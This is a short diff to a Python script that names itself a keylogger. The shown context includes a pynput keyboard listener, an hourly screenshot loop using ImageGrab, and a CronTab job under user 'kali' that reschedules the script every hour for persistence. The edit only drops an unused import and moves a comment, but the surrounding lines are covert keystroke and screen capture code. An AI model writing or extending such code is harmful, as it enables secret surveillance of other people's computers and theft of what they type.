@@ -4,7 +4,6 @@ from pynput.keyboard import Key, Listener
 import logging
 from crontab import CronTab
 from PIL import ImageGrab
-import sched
 
 screenshot_info = "screenshot.png"
 
@@ -64,7 +63,8 @@ def screenshot():
 while True:
     screenshot()
     time.sleep(3600)
-# Create a cronjob to run this script once an hour to make sure we keep capturing
+
+    # Create a cronjob to run this script once an hour to make sure we keep capturing
 key_cron = CronTab(user='kali')
 job2 = key_cron.new(command='./PATH_TO_KEYLOGGER.PY')
 job2.hour.every(1)
